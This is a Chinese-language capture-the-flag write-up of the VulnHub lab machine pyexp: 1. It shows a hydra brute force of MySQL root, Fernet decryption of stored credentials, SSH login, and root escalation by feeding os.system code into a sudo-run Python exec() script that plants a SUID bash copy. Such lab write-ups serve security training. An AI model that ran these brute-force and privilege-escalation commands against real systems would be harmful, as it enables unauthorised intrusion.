# pyexp: 1

2024-5-22 https://www.vulnhub.com/entry/pyexp-1,534/

difficulty: easy

## IP

192.168.10.185

## Scan

Open Port -> 1337,3306

```
PORT     STATE SERVICE VERSION
1337/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 f7af6cd12694dce51a221a644e1c34a9 (RSA)
|   256 46d28dbd2f9eafcee2455ca612c0d919 (ECDSA)
|_  256 8d11edff7dc5a72499227fce2988b24a (ED25519)
3306/tcp open  mysql   MySQL 5.5.5-10.3.23-MariaDB-0+deb10u1
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.23-MariaDB-0+deb10u1
|   Thread ID: 38
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsTransactions, IgnoreSigpipes, Speaks41ProtocolOld, ConnectWithDatabase, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, FoundRows, SupportsLoadDataLocal, ODBCClient, SupportsCompression, LongColumnFlag, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: PLm_sGEeN8i*2[TurYI>
|_  Auth Plugin Name: mysql_native_password
```

就开了 ssh 和 mysql，剩下啥都没有，尝试爆破下 mysql 的 root 密码吧，ssh 也不知道用户名，暂时没法爆破。

```
hydra -t 20 -l root -P ~/tools/dict/rockyou.txt mysql://192.168.10.185
```

找到 root 的密码: prettywoman

使用 mysql 连接，看看数据库里有没有什么提示信息。data 数据库中有一个 fernet 表：

```
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
| cred                                                                                                                     | keyy                                         |
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
| gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys= | UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0= |
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
```

Fernet 是 Python 中的加密库，用于在传输过程中加密和解密数据。在 cyberchef 中找到了对应的解密 Fernet Decrypt，解密后得到用户凭据：

```
lucy:wJ9`"Lemdv9[FEw-
```

尝试使用此凭据，ssh 登陆：

```
ssh lucy@192.168.10.185 -p 1337
```

当前目录得到了 user flag：

```
lucy@pyexp:~$ cat user.txt
8ca196f62e91847f07f8043b499bd9be
```

sudo 显示：

```
(root) NOPASSWD: /usr/bin/python2 /opt/exp.py

lucy@pyexp:~$ cat /opt/exp.py
uinput = raw_input('how are you?')
exec(uinput)
```

exec 可以执行 python 代码，所以需要将下面的攻击代码作为输入：

```
lucy@pyexp:~$ sudo -u root /usr/bin/python2 /opt/exp.py
how are you?import os;os.system('cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash')
```

在/tmp 中执行，最终得到 root 权限：

```
lucy@pyexp:/tmp$ ./rootbash -p
rootbash-5.0# id
uid=1000(lucy) gid=1000(lucy) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(lucy)
rootbash-5.0# cd /root
rootbash-5.0# ls
root.txt
rootbash-5.0# cat root.txt
a7a7e80ff4920ff06f049012700c99a8
```
